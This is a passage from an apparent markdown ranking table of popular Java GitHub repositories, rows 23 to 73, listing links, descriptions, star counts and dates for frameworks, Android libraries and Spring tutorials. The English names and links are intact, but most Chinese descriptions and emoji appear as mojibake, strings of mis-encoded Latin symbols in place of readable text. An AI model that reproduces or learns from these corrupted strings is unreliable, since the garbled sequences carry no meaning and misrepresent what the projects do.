|23|[xuxueli/xxl-job](https://github.com/xuxueli/xxl-job)|A distributed task scheduling framework.ÔºàÂàÜÂ∏ÉÂºè‰ªªÂä°Ë∞ÉÂ∫¶Âπ≥Âè∞XXL-JOBÔºâ|16.1k|Java|10/29|
|24|[didi/DoraemonKit](https://github.com/didi/DoraemonKit)|A full-featured App (iOS & Android) development assistant. You deserve it.  ÁÆÄÁß∞ ""DoKit"" „ÄÇ‰∏ÄÊ¨æÂäüËÉΩÈΩêÂÖ®ÁöÑÂÆ¢Êà∑Á´ØÔºà iOS „ÄÅAndroid„ÄÅÂæÆ‰ø°Â∞èÁ®ãÂ∫è ÔºâÁ†îÂèëÂä©ÊâãÔºå‰Ω†ÂÄºÂæóÊã•Êúâ„ÄÇhttps://www.dokit.cn/|15.8k|Java|10/29|
|25|[shuzheng/zheng](https://github.com/shuzheng/zheng)|Âü∫‰∫éSpring+SpringMVC+MybatisÂàÜÂ∏ÉÂºèÊïèÊç∑ÂºÄÂèëÁ≥ªÁªüÊû∂ÊûÑÔºåÊèê‰æõÊï¥Â•óÂÖ¨ÂÖ±ÂæÆÊúçÂä°ÊúçÂä°Ê®°ÂùóÔºöÈõÜ‰∏≠ÊùÉÈôêÁÆ°ÁêÜÔºàÂçïÁÇπÁôªÂΩïÔºâ„ÄÅÂÜÖÂÆπÁÆ°ÁêÜ„ÄÅÊîØ‰ªò‰∏≠ÂøÉ„ÄÅÁî®Êà∑ÁÆ°ÁêÜÔºàÊîØÊåÅÁ¨¨‰∏âÊñπÁôªÂΩïÔºâ„ÄÅÂæÆ‰ø°Âπ≥Âè∞„ÄÅÂ≠òÂÇ®Á≥ªÁªü„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÊó•ÂøóÂàÜÊûê„ÄÅ‰ªªÂä°ÂíåÈÄöÁü•Á≠âÔºåÊîØÊåÅÊúçÂä°Ê≤ªÁêÜ„ÄÅÁõëÊéßÂíåËøΩË∏™ÔºåÂä™Âäõ‰∏∫‰∏≠Â∞èÂûã‰ºÅ‰∏öÊâìÈÄ†ÂÖ®Êñπ‰ΩçJ2EE‰ºÅ‰∏öÁ∫ßÂºÄÂèëËß£ÂÜ≥ÊñπÊ°à„ÄÇ|15.7k|Java|10/13|
|26|[CarGuo/GSYVideoPlayer](https://github.com/CarGuo/GSYVideoPlayer)|ËßÜÈ¢ëÊí≠ÊîæÂô®ÔºàIJKplayer„ÄÅExoPlayer„ÄÅMediaPlayerÔºâÔºåHTTPSÔºåÊîØÊåÅÂºπÂπïÔºåÂ§ñÊåÇÂ≠óÂπïÔºåÊîØÊåÅÊª§Èïú„ÄÅÊ∞¥Âç∞„ÄÅgifÊà™ÂõæÔºåÁâáÂ§¥ÂπøÂëä„ÄÅ‰∏≠Èó¥ÂπøÂëäÔºåÂ§ö‰∏™ÂêåÊó∂Êí≠ÊîæÔºåÊîØÊåÅÂü∫Êú¨ÁöÑÊãñÂä®ÔºåÂ£∞Èü≥„ÄÅ‰∫ÆÂ∫¶Ë∞ÉËäÇÔºåÊîØÊåÅËæπÊí≠ËæπÁºìÂ≠òÔºåÊîØÊåÅËßÜÈ¢ëËá™Â∏¶rotationÁöÑÊóãËΩ¨Ôºà90,270‰πãÁ±ªÔºâÔºåÈáçÂäõÊóãËΩ¨‰∏éÊâãÂä®ÊóãËΩ¨ÁöÑÂêåÊ≠•ÊîØÊåÅÔºåÊîØÊåÅÂàóË°®Êí≠Êîæ ÔºåÂàóË°®ÂÖ®Â±èÂä®ÁîªÔºåËßÜÈ¢ëÂä†ËΩΩÈÄüÂ∫¶ÔºåÂàóË°®Â∞èÁ™óÂè£ÊîØÊåÅÊãñÂä®ÔºåÂä®ÁîªÊïàÊûúÔºåË∞ÉÊï¥ÊØî‰æãÔºåÂ§öÂàÜËæ®ÁéáÂàáÊç¢ÔºåÊîØÊåÅÂàáÊç¢Êí≠ÊîæÂô®ÔºåËøõÂ∫¶Êù°Â∞èÁ™óÂè£È¢ÑËßàÔºåÂàóË°®ÂàáÊç¢ËØ¶ÊÉÖÈ°µÈù¢Êó†ÁºùÊí≠ÊîæÔºårtsp„ÄÅconcat„ÄÅmpeg„ÄÇ |15.1k|Java|10/26|
|27|[linlinjava/litemall](https://github.com/linlinjava/litemall)|Âèà‰∏Ä‰∏™Â∞èÂïÜÂüé„ÄÇlitemall = Spring BootÂêéÁ´Ø + VueÁÆ°ÁêÜÂëòÂâçÁ´Ø + ÂæÆ‰ø°Â∞èÁ®ãÂ∫èÁî®Êà∑ÂâçÁ´Ø + VueÁî®Êà∑ÁßªÂä®Á´Ø|14.5k|Java|10/28|
|28|[dianping/cat](https://github.com/dianping/cat)|CAT ‰Ωú‰∏∫ÊúçÂä°Á´ØÈ°πÁõÆÂü∫Á°ÄÁªÑ‰ª∂ÔºåÊèê‰æõ‰∫Ü Java, C/C++, Node.js, Python, Go Á≠âÂ§öËØ≠Ë®ÄÂÆ¢Êà∑Á´ØÔºåÂ∑≤ÁªèÂú®ÁæéÂõ¢ÁÇπËØÑÁöÑÂü∫Á°ÄÊû∂ÊûÑ‰∏≠Èó¥‰ª∂Ê°ÜÊû∂ÔºàMVCÊ°ÜÊû∂ÔºåRPCÊ°ÜÊû∂ÔºåÊï∞ÊçÆÂ∫ìÊ°ÜÊû∂ÔºåÁºìÂ≠òÊ°ÜÊû∂Á≠âÔºåÊ∂àÊÅØÈòüÂàóÔºåÈÖçÁΩÆÁ≥ªÁªüÁ≠âÔºâÊ∑±Â∫¶ÈõÜÊàêÔºå‰∏∫ÁæéÂõ¢ÁÇπËØÑÂêÑ‰∏öÂä°Á∫øÊèê‰æõÁ≥ªÁªü‰∏∞ÂØåÁöÑÊÄßËÉΩÊåáÊ†á„ÄÅÂÅ•Â∫∑Áä∂ÂÜµ„ÄÅÂÆûÊó∂ÂëäË≠¶Á≠â„ÄÇ|14.4k|Java|10/13|
|29|[forezp/SpringCloudLearning](https://github.com/forezp/SpringCloudLearning)|„ÄäÂè≤‰∏äÊúÄÁÆÄÂçïÁöÑSpring CloudÊïôÁ®ãÊ∫êÁ†Å„Äã|14.4k|Java|06/10|
|30|[alibaba/Sentinel](https://github.com/alibaba/Sentinel)|A powerful flow control component enabling reliability, resilience and monitoring for microservices. (Èù¢Âêë‰∫ëÂéüÁîüÂæÆÊúçÂä°ÁöÑÈ´òÂèØÁî®ÊµÅÊéßÈò≤Êä§ÁªÑ‰ª∂)|14.2k|Java|10/29|
|31|[JeffLi1993/springboot-learning-example](https://github.com/JeffLi1993/springboot-learning-example)|spring boot ÂÆûË∑µÂ≠¶‰π†Ê°à‰æãÔºåÊòØ spring boot ÂàùÂ≠¶ËÄÖÂèäÊ†∏ÂøÉÊäÄÊúØÂ∑©Âõ∫ÁöÑÊúÄ‰Ω≥ÂÆûË∑µ„ÄÇÂè¶Â§ñÂÜôÂçöÂÆ¢ÔºåÁî® OpenWrite„ÄÇ|13.6k|Java|10/13|
|32|[alibaba/ARouter](https://github.com/alibaba/ARouter)|üí™ A framework for assisting in the renovation of Android componentization (Â∏ÆÂä© Android App ËøõË°åÁªÑ‰ª∂ÂåñÊîπÈÄ†ÁöÑË∑ØÁî±Ê°ÜÊû∂)|12.5k|Java|10/22|
|33|[Tencent/QMUI_Android](https://github.com/Tencent/QMUI_Android)|ÊèêÈ´ò Android UI ÂºÄÂèëÊïàÁéáÁöÑ UI Â∫ì|12.3k|Java|10/28|
|34|[dyc87112/SpringBoot-Learning](https://github.com/dyc87112/SpringBoot-Learning)|Spring BootÂü∫Á°ÄÊïôÁ®ãÔºåSpring Boot 2.xÁâàÊú¨ËøûËΩΩ‰∏≠ÔºÅÔºÅÔºÅ|12.3k|Java|09/11|
|35|[Bigkoo/Android-PickerView](https://github.com/Bigkoo/Android-PickerView)|This is a picker view for android , support linkage effect, timepicker and optionspicker.ÔºàÊó∂Èó¥ÈÄâÊã©Âô®„ÄÅÁúÅÂ∏ÇÂå∫‰∏âÁ∫ßËÅîÂä®Ôºâ|12.2k|Java|10/23|
|36|[elunez/eladmin](https://github.com/elunez/eladmin)|È°πÁõÆÂü∫‰∫é Spring Boot 2.1.0 „ÄÅ Jpa„ÄÅ Spring Security„ÄÅredis„ÄÅVueÁöÑÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÈ°πÁõÆÈááÁî®ÂàÜÊ®°ÂùóÂºÄÂèëÊñπÂºèÔºå ÊùÉÈôêÊéßÂà∂ÈááÁî® RBACÔºåÊîØÊåÅÊï∞ÊçÆÂ≠óÂÖ∏‰∏éÊï∞ÊçÆÊùÉÈôêÁÆ°ÁêÜÔºåÊîØÊåÅ‰∏ÄÈîÆÁîüÊàêÂâçÂêéÁ´Ø‰ª£Á†ÅÔºåÊîØÊåÅÂä®ÊÄÅË∑ØÁî±|11.6k|Java|10/27|
|37|[JessYanCoding/AndroidAutoSize](https://github.com/JessYanCoding/AndroidAutoSize)|üî• A low-cost Android screen adaptation solution (‰ªäÊó•Â§¥Êù°Â±èÂπïÈÄÇÈÖçÊñπÊ°àÁªàÊûÅÁâàÔºå‰∏Ä‰∏™ÊûÅ‰ΩéÊàêÊú¨ÁöÑ Android Â±èÂπïÈÄÇÈÖçÊñπÊ°à).|10.7k|Java|07/15|
|38|[youth5201314/banner](https://github.com/youth5201314/banner)|üî•üî•üî•Banner 2.0 Êù•‰∫ÜÔºÅAndroidÂπøÂëäÂõæÁâáËΩÆÊí≠Êéß‰ª∂ÔºåÂÜÖÈÉ®Âü∫‰∫éViewPager2ÂÆûÁé∞ÔºåIndicatorÂíåUIÈÉΩÂèØ‰ª•Ëá™ÂÆö‰πâ„ÄÇ|10.5k|Java|08/25|
|39|[jeasonlzy/okhttp-OkGo](https://github.com/jeasonlzy/okhttp-OkGo)|OkGo - 3.0 ÈúáÊíºÊù•Ë¢≠ÔºåËØ•Â∫ìÊòØÂü∫‰∫é Http ÂçèËÆÆÔºåÂ∞ÅË£Ö‰∫Ü OkHttp ÁöÑÁΩëÁªúËØ∑Ê±ÇÊ°ÜÊû∂ÔºåÊØî Retrofit Êõ¥ÁÆÄÂçïÊòìÁî®ÔºåÊîØÊåÅ RxJavaÔºåRxJava2ÔºåÊîØÊåÅËá™ÂÆö‰πâÁºìÂ≠òÔºåÊîØÊåÅÊâπÈáèÊñ≠ÁÇπ‰∏ãËΩΩÁÆ°ÁêÜÂíåÊâπÈáè‰∏ä‰º†ÁÆ°ÁêÜÂäüËÉΩ|10.2k|Java|05/09|
|40|[JessYanCoding/MVPArms](https://github.com/JessYanCoding/MVPArms)|‚öîÔ∏è A common architecture for Android applications developing based on MVP, integrates many open source projects, to make your developing quicker and easier (‰∏Ä‰∏™Êï¥Âêà‰∫ÜÂ§ßÈáè‰∏ªÊµÅÂºÄÊ∫êÈ°πÁõÆÈ´òÂ∫¶ÂèØÈÖçÁΩÆÂåñÁöÑ Android MVP Âø´ÈÄüÈõÜÊàêÊ°ÜÊû∂). |9.8k|Java|10/20|
|41|[pagehelper/Mybatis-PageHelper](https://github.com/pagehelper/Mybatis-PageHelper)|MybatisÈÄöÁî®ÂàÜÈ°µÊèí‰ª∂|9.8k|Java|10/13|
|42|[justauth/JustAuth](https://github.com/justauth/JustAuth)|:100: Â∞èËÄåÂÖ®ËÄåÁæéÁöÑÁ¨¨‰∏âÊñπÁôªÂΩïÂºÄÊ∫êÁªÑ‰ª∂„ÄÇÁõÆÂâçÂ∑≤ÊîØÊåÅGithub„ÄÅGitee„ÄÅÂæÆÂçö„ÄÅÈíâÈíâ„ÄÅÁôæÂ∫¶„ÄÅCoding„ÄÅËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÂπ≥Âè∞„ÄÅOSChina„ÄÅÊîØ‰ªòÂÆù„ÄÅQQ„ÄÅÂæÆ‰ø°„ÄÅÊ∑òÂÆù„ÄÅGoogle„ÄÅFacebook„ÄÅÊäñÈü≥„ÄÅÈ¢ÜËã±„ÄÅÂ∞èÁ±≥„ÄÅÂæÆËΩØ„ÄÅ‰ªäÊó•Â§¥Êù°„ÄÅTeambition„ÄÅStackOverflow„ÄÅPinterest„ÄÅ‰∫∫‰∫∫„ÄÅÂçé‰∏∫„ÄÅ‰ºÅ‰∏öÂæÆ‰ø°„ÄÅÈÖ∑ÂÆ∂‰πê„ÄÅGitlab„ÄÅÁæéÂõ¢„ÄÅÈ•ø‰∫Ü‰πàÂíåÊé®ÁâπÁ≠âÁ¨¨‰∏âÊñπÂπ≥Âè∞ÁöÑÊéàÊùÉÁôªÂΩï„ÄÇ Login, so easy!|9.5k|Java|10/25|
|43|[LuckSiege/PictureSelector](https://github.com/LuckSiege/PictureSelector)|Picture Selector Library for Android  or ÂõæÁâáÈÄâÊã©Âô®|9.4k|Java|10/29|
|44|[seaswalker/spring-analysis](https://github.com/seaswalker/spring-analysis)|SpringÊ∫êÁ†ÅÈòÖËØª|9.2k|Java|10/13|
|45|[frank-lam/fullstack-tutorial](https://github.com/frank-lam/fullstack-tutorial)|üöÄ fullstack tutorial 2020ÔºåÂêéÂè∞ÊäÄÊúØÊ†à/Êû∂ÊûÑÂ∏à‰πãË∑Ø/ÂÖ®Ê†àÂºÄÂèëÁ§æÂå∫ÔºåÊò•Êãõ/ÁßãÊãõ/Ê†°Êãõ/Èù¢ËØï|9.0k|Java|05/30|
|46|[daniulive/SmarterStreaming](https://github.com/daniulive/SmarterStreaming)|‰∏öÂÜÖ‰∏∫Êï∞‰∏çÂ§öËá¥Âäõ‰∫éÊûÅËá¥‰ΩìÈ™åÁöÑË∂ÖÂº∫ÂÖ®Ëá™Á†îË∑®Âπ≥Âè∞(windows/android/iOS)ÊµÅÂ™í‰ΩìÂÜÖÊ†∏ÔºåÈÄöËøáÊ®°ÂùóÂåñËá™Áî±ÁªÑÂêàÔºåÊîØÊåÅÂÆûÊó∂RTMPÊé®ÊµÅ„ÄÅRTSPÊé®ÊµÅ„ÄÅRTMPÊí≠ÊîæÂô®„ÄÅRTSPÊí≠ÊîæÂô®„ÄÅÂΩïÂÉè„ÄÅÂ§öË∑ØÊµÅÂ™í‰ΩìËΩ¨Âèë„ÄÅÈü≥ËßÜÈ¢ëÂØºÊí≠„ÄÅÂä®ÊÄÅËßÜÈ¢ëÂêàÊàê„ÄÅÈü≥È¢ëÊ∑∑Èü≥„ÄÅÁõ¥Êí≠‰∫íÂä®„ÄÅÂÜÖÁΩÆËΩªÈáèÁ∫ßRTSPÊúçÂä°Á≠âÔºåÊØîÂø´Êõ¥Âø´Ôºå‰∏öÁïåÁúüÊ≠£Èù†Ë∞±ÁöÑË∂Ö‰ΩéÂª∂ËøüÁõ¥Êí≠SDK(1ÁßíÂÜÖÔºå‰ΩéÂª∂ËøüÊ®°Âºè‰∏ã200~400ms)„ÄÇ|9.0k|Java|10/27|
|47|[gyf-dev/ImmersionBar](https://github.com/gyf-dev/ImmersionBar)|android 4.4‰ª•‰∏äÊ≤âÊµ∏ÂºèÁä∂ÊÄÅÊ†èÂíåÊ≤âÊµ∏ÂºèÂØºËà™Ê†èÁÆ°ÁêÜÔºåÈÄÇÈÖçÊ®™Á´ñÂ±èÂàáÊç¢„ÄÅÂàòÊµ∑Â±è„ÄÅËΩØÈîÆÁõòÂºπÂá∫Á≠âÈóÆÈ¢òÔºåÂèØ‰ª•‰øÆÊîπÁä∂ÊÄÅÊ†èÂ≠ó‰ΩìÈ¢úËâ≤ÂíåÂØºËà™Ê†èÂõæÊ†áÈ¢úËâ≤Ôºå‰ª•Âèä‰∏çÂèØ‰øÆÊîπÂ≠ó‰ΩìÈ¢úËâ≤ÊâãÊú∫ÁöÑÈÄÇÈÖçÔºåÈÄÇÁî®‰∫éActivity„ÄÅFragment„ÄÅDialogFragment„ÄÅDialogÔºåPopupWindowÔºå‰∏ÄÂè•‰ª£Á†ÅËΩªÊùæÂÆûÁé∞Ôºå‰ª•ÂèäÂØπbarÁöÑÂÖ∂‰ªñËÆæÁΩÆÔºåËØ¶ËßÅREADME„ÄÇÁÆÄ‰π¶ËØ∑ÂèÇËÄÉÔºöhttp://www.jianshu.com/p/2a884e211a62|8.9k|Java|10/16|
|48|[bilibili/DanmakuFlameMaster](https://github.com/bilibili/DanmakuFlameMaster)|AndroidÂºÄÊ∫êÂºπÂπïÂºïÊìé¬∑ÁÉàÁÑ∞ÂºπÂπï‰Ωø ÔΩû|8.7k|Java|02/27|
|49|[paascloud/paascloud-master](https://github.com/paascloud/paascloud-master)|spring cloud + vue + oAuth2.0ÂÖ®ÂÆ∂Ê°∂ÂÆûÊàòÔºåÂâçÂêéÁ´ØÂàÜÁ¶ªÊ®°ÊãüÂïÜÂüéÔºåÂÆåÊï¥ÁöÑË¥≠Áâ©ÊµÅÁ®ã„ÄÅÂêéÁ´ØËøêËê•Âπ≥Âè∞ÔºåÂèØ‰ª•ÂÆûÁé∞Âø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÁ∫ßÂæÆÊúçÂä°È°πÁõÆ„ÄÇÊîØÊåÅÂæÆ‰ø°ÁôªÂΩïÁ≠â‰∏âÊñπÁôªÂΩï„ÄÇ|8.5k|Java|07/02|
|50|[zhisheng17/flink-learning](https://github.com/zhisheng17/flink-learning)|flink learning blog. http://www.flink-learning.com  Âê´ Flink ÂÖ•Èó®„ÄÅÊ¶ÇÂøµ„ÄÅÂéüÁêÜ„ÄÅÂÆûÊàò„ÄÅÊÄßËÉΩË∞É‰ºò„ÄÅÊ∫êÁ†ÅËß£ÊûêÁ≠âÂÜÖÂÆπ„ÄÇÊ∂âÂèä Flink Connector„ÄÅMetrics„ÄÅLibrary„ÄÅDataStream API„ÄÅTable API & SQL Á≠âÂÜÖÂÆπÁöÑÂ≠¶‰π†Ê°à‰æãÔºåËøòÊúâ Flink ËêΩÂú∞Â∫îÁî®ÁöÑÂ§ßÂûãÈ°πÁõÆÊ°à‰æãÔºàPVUV„ÄÅÊó•ÂøóÂ≠òÂÇ®„ÄÅÁôæ‰∫øÊï∞ÊçÆÂÆûÊó∂ÂéªÈáç„ÄÅÁõëÊéßÂëäË≠¶ÔºâÂàÜ‰∫´„ÄÇÊ¨¢ËøéÂ§ßÂÆ∂ÊîØÊåÅÊàëÁöÑ‰∏ìÊ†è„ÄäÂ§ßÊï∞ÊçÆÂÆûÊó∂ËÆ°ÁÆóÂºïÊìé Flink ÂÆûÊàò‰∏éÊÄßËÉΩ‰ºòÂåñ„Äã|8.4k|Java|10/17|
|51|[hyb1996/Auto.js](https://github.com/hyb1996/Auto.js)|A UiAutomator on android, does not need root access(ÂÆâÂçìÂπ≥Âè∞‰∏äÁöÑJavaScriptËá™Âä®ÂåñÂ∑•ÂÖ∑)|8.3k|Java|10/07|
|52|[lihengming/spring-boot-api-project-seed](https://github.com/lihengming/spring-boot-api-project-seed)|:seedling::rocket:‰∏Ä‰∏™Âü∫‰∫éSpring Boot & MyBatisÁöÑÁßçÂ≠êÈ°πÁõÆÔºåÁî®‰∫éÂø´ÈÄüÊûÑÂª∫‰∏≠Â∞èÂûãAPI„ÄÅRESTful APIÈ°πÁõÆ~|8.3k|Java|10/22|
|53|[YunaiV/SpringBoot-Labs](https://github.com/YunaiV/SpringBoot-Labs)|‰∏Ä‰∏™Ê∂µÁõñÂÖ≠‰∏™‰∏ìÊ†èÔºöSpring Boot 2.X„ÄÅSpring Cloud„ÄÅSpring Cloud Alibaba„ÄÅDubbo„ÄÅÂàÜÂ∏ÉÂºèÊ∂àÊÅØÈòüÂàó„ÄÅÂàÜÂ∏ÉÂºè‰∫ãÂä°ÁöÑ‰ªìÂ∫ì„ÄÇÂ∏åÊúõËÉñÂèãÂ∞èÊâã‰∏ÄÊäñÔºåÂè≥‰∏äËßíÊù•‰∏™ StarÔºåÊÑüÊÅ© 1024|8.2k|Java|10/23|
|54|[APIJSON/APIJSON](https://github.com/APIJSON/APIJSON)|üèÜÁ†Å‰∫ëÊúÄÊúâ‰ª∑ÂÄºÂºÄÊ∫êÈ°πÁõÆ üöÄÂêéÁ´ØÊé•Âè£ÂíåÊñáÊ°£Ëá™Âä®ÂåñÔºåÂâçÁ´Ø(ÂÆ¢Êà∑Á´Ø) ÂÆöÂà∂ËøîÂõû JSON ÁöÑÊï∞ÊçÆÂíåÁªìÊûÑÔºÅüèÜGitee Most Valuable Project üöÄA JSON Transmission Protocol and an ORM Library for automatically providing APIs and Docs.|8.2k|Java|10/27|
|55|[heibaiying/BigData-Notes](https://github.com/heibaiying/BigData-Notes)|Â§ßÊï∞ÊçÆÂÖ•Èó®ÊåáÂçó  :star:|8.2k|Java|10/20|
|56|[hackware1993/MagicIndicator](https://github.com/hackware1993/MagicIndicator)|A powerful, customizable and extensible ViewPager indicator framework. As the best alternative of ViewPagerIndicator, TabLayout and PagerSlidingTabStrip   ‚Äî‚Äî   Âº∫Â§ß„ÄÅÂèØÂÆöÂà∂„ÄÅÊòìÊâ©Â±ïÁöÑ ViewPager ÊåáÁ§∫Âô®Ê°ÜÊû∂„ÄÇÊòØViewPagerIndicator„ÄÅTabLayout„ÄÅPagerSlidingTabStripÁöÑÊúÄ‰Ω≥Êõø‰ª£ÂìÅ„ÄÇÊîØÊåÅËßíÊ†áÔºåÊõ¥ÊîØÊåÅÂú®ÈùûViewPagerÂú∫ÊôØ‰∏ã‰ΩøÁî®Ôºà‰ΩøÁî®hide()„ÄÅshow()ÂàáÊç¢FragmentÊàñ‰ΩøÁî®se ...|8.2k|Java|09/29|
|57|[hs-web/hsweb-framework](https://github.com/hs-web/hsweb-framework)|hsweb (ha äs w…õb) ÊòØ‰∏Ä‰∏™Áî®‰∫éÂø´ÈÄüÊê≠Âª∫‰ºÅ‰∏öÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑÂü∫Á°ÄÈ°πÁõÆ,ÈõÜÊàê‰∏ÄÊèΩÂ≠ê‰æøÊç∑ÂäüËÉΩÂ¶Ç:‰æøÊç∑ÁöÑÈÄöÁî®Â¢ûÂà†ÊîπÊü•,Âº∫Â§ßÁöÑÊùÉÈôêÁÆ°ÁêÜ,Âä®ÊÄÅÂ§öÊï∞ÊçÆÊ∫ê,Âä®ÊÄÅË°®Âçï,Âú®Á∫øÊï∞ÊçÆÂ∫ìÁª¥Êä§Á≠â. Âü∫‰∫é spring-boot,mybaits.|7.4k|Java|10/29|
|58|[DuGuQiuBai/Java](https://github.com/DuGuQiuBai/Java)|27Â§©Êàê‰∏∫JavaÂ§ßÁ•û|7.3k|Java|10/18|
|59|[macrozheng/mall-learning](https://github.com/macrozheng/mall-learning)|mallÂ≠¶‰π†ÊïôÁ®ãÔºåÊû∂ÊûÑ„ÄÅ‰∏öÂä°„ÄÅÊäÄÊúØË¶ÅÁÇπÂÖ®Êñπ‰ΩçËß£Êûê„ÄÇmallÈ°πÁõÆÔºà39k+starÔºâÊòØ‰∏ÄÂ•óÁîµÂïÜÁ≥ªÁªüÔºå‰ΩøÁî®Áé∞Èò∂ÊÆµ‰∏ªÊµÅÊäÄÊúØÂÆûÁé∞„ÄÇÊ∂µÁõñ‰∫ÜSpringBoot 2.3.0„ÄÅMyBatis 3.4.6„ÄÅElasticsearch 7.6.2„ÄÅRabbitMQ 3.7.15„ÄÅRedis 5.0„ÄÅMongoDB 4.2.5„ÄÅMysql5.7Á≠âÊäÄÊúØÔºåÈááÁî®DockerÂÆπÂô®ÂåñÈÉ®ÁΩ≤„ÄÇ|7.1k|Java|10/28|
|60|[huanghaibin-dev/CalendarView](https://github.com/huanghaibin-dev/CalendarView)|Android‰∏ä‰∏Ä‰∏™‰ºòÈõÖ„ÄÅ‰∏áËÉΩËá™ÂÆö‰πâUI„ÄÅÊîØÊåÅÂë®ËßÜÂõæ„ÄÅËá™ÂÆö‰πâÂë®Ëµ∑Âßã„ÄÅÊÄßËÉΩÈ´òÊïàÁöÑÊó•ÂéÜÊéß‰ª∂ÔºåÊîØÊåÅÁÉ≠ÊèíÊãîÂÆûÁé∞ÁöÑUIÂÆöÂà∂ÔºÅÊîØÊåÅÊ†áËÆ∞„ÄÅËá™ÂÆö‰πâÈ¢úËâ≤„ÄÅÂÜúÂéÜ„ÄÅËá™ÂÆö‰πâÊúàËßÜÂõæÂêÑÁßçÊòæÁ§∫Ê®°ÂºèÁ≠â„ÄÇCanvasÁªòÂà∂ÔºåÈÄüÂ∫¶Âø´„ÄÅÂç†Áî®ÂÜÖÂ≠ò‰ΩéÔºå‰Ω†ÁúüÁöÑÊÉ≥‰∏çÂà∞Êó•ÂéÜÂ±ÖÁÑ∂ËøòÂèØ‰ª•Â¶ÇÊ≠§‰ºòÈõÖÔºÅAn elegant, highly customized and high-performance Calendar Widget on Android.|7.1k|Java|09/16|
|61|[crossoverJie/cim](https://github.com/crossoverJie/cim)|üì≤cim(cross IM) ÈÄÇÁî®‰∫éÂºÄÂèëËÄÖÁöÑÂàÜÂ∏ÉÂºèÂç≥Êó∂ÈÄöËÆØÁ≥ªÁªü|6.9k|Java|10/13|
|62|[alibaba/otter](https://github.com/alibaba/otter)|ÈòøÈáåÂ∑¥Â∑¥ÂàÜÂ∏ÉÂºèÊï∞ÊçÆÂ∫ìÂêåÊ≠•Á≥ªÁªü(Ëß£ÂÜ≥‰∏≠ÁæéÂºÇÂú∞Êú∫Êàø)|6.2k|Java|10/13|
|63|[dyc87112/SpringCloud-Learning](https://github.com/dyc87112/SpringCloud-Learning)|Spring CloudÂü∫Á°ÄÊïôÁ®ãÔºåÊåÅÁª≠ËøûËΩΩÊõ¥Êñ∞‰∏≠|6.2k|Java|09/10|
|64|[gedoor/MyBookshelf](https://github.com/gedoor/MyBookshelf)|ÈòÖËØªÊòØ‰∏ÄÊ¨æÂèØ‰ª•Ëá™ÂÆö‰πâÊù•Ê∫êÈòÖËØªÁΩëÁªúÂÜÖÂÆπÁöÑÂ∑•ÂÖ∑Ôºå‰∏∫ÂπøÂ§ßÁΩëÁªúÊñáÂ≠¶Áà±Â•ΩËÄÖÊèê‰æõ‰∏ÄÁßçÊñπ‰æø„ÄÅÂø´Êç∑ËàíÈÄÇÁöÑËØïËØª‰ΩìÈ™å„ÄÇ|6.1k|Java|10/28|
|65|[Exrick/xmall](https://github.com/Exrick/xmall)|Âü∫‰∫éSOAÊû∂ÊûÑÁöÑÂàÜÂ∏ÉÂºèÁîµÂïÜË¥≠Áâ©ÂïÜÂüé ÂâçÂêéÁ´ØÂàÜÁ¶ª ÂâçÂè∞ÂïÜÂüé:VueÂÖ®ÂÆ∂Ê°∂ ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªü:Dubbo/SSM/Elasticsearch/Redis/MySQL/ActiveMQ/Shiro/ZookeeperÁ≠â|5.9k|Java|10/13|
|66|[goldze/MVVMHabit](https://github.com/goldze/MVVMHabit)|üëïÂü∫‰∫éË∞∑Ê≠åÊúÄÊñ∞AACÊû∂ÊûÑÔºåMVVMËÆæËÆ°Ê®°ÂºèÁöÑ‰∏ÄÂ•óÂø´ÈÄüÂºÄÂèëÂ∫ìÔºåÊï¥ÂêàOkhttp+RxJava+Retrofit+GlideÁ≠â‰∏ªÊµÅÊ®°ÂùóÔºåÊª°Ë∂≥Êó•Â∏∏ÂºÄÂèëÈúÄÊ±Ç„ÄÇ‰ΩøÁî®ËØ•Ê°ÜÊû∂ÂèØ‰ª•Âø´ÈÄüÂºÄÂèë‰∏Ä‰∏™È´òË¥®Èáè„ÄÅÊòìÁª¥Êä§ÁöÑAndroidÂ∫îÁî®„ÄÇ|5.9k|Java|06/05|
|67|[smuyyh/BookReader](https://github.com/smuyyh/BookReader)|:closed_book:  ""‰ªªÈòÖ"" ÁΩëÁªúÂ∞èËØ¥ÈòÖËØªÂô®Ôºå3DÁøªÈ°µÊïàÊûú„ÄÅtxt/pdf/epub‰π¶Á±çÈòÖËØª„ÄÅWifi‰º†‰π¶~|5.7k|Java|09/02|
|68|[Meituan-Dianping/walle](https://github.com/Meituan-Dianping/walle)|Android Signature V2 SchemeÁ≠æÂêç‰∏ãÁöÑÊñ∞‰∏Ä‰ª£Ê∏†ÈÅìÂåÖÊâìÂåÖÁ•ûÂô®|5.7k|Java|07/24|
|69|[NLPchina/ansj_seg](https://github.com/NLPchina/ansj_seg)|ansjÂàÜËØç.ictÁöÑÁúüÊ≠£javaÂÆûÁé∞.ÂàÜËØçÊïàÊûúÈÄüÂ∫¶ÈÉΩË∂ÖËøáÂºÄÊ∫êÁâàÁöÑict. ‰∏≠ÊñáÂàÜËØç,‰∫∫ÂêçËØÜÂà´,ËØçÊÄßÊ†áÊ≥®,Áî®Êà∑Ëá™ÂÆö‰πâËØçÂÖ∏|5.7k|Java|10/28|
|70|[sparklemotion/nokogiri](https://github.com/sparklemotion/nokogiri)|Nokogiri (Èã∏) is a Rubygem providing HTML, XML, SAX, and Reader parsers with XPath and CSS selector support.|5.5k|Java|10/30|
|71|[lenve/VBlog](https://github.com/lenve/VBlog)|VÈÉ®ËêΩÔºåVue+SpringBootÂÆûÁé∞ÁöÑÂ§öÁî®Êà∑ÂçöÂÆ¢ÁÆ°ÁêÜÂπ≥Âè∞!|5.5k|Java|09/04|
|72|[zouzg/mybatis-generator-gui](https://github.com/zouzg/mybatis-generator-gui)|mybatis-generatorÁïåÈù¢Â∑•ÂÖ∑ÔºåËÆ©‰Ω†ÁîüÊàê‰ª£Á†ÅÊõ¥ÁÆÄÂçïÊõ¥Âø´Êç∑|5.5k|Java|10/13|
|73|[wildfirechat/server](https://github.com/wildfirechat/server)|Âç≥Êó∂ÈÄöËÆØ(IM)Á≥ªÁªü|5.5k|Java|10/28|
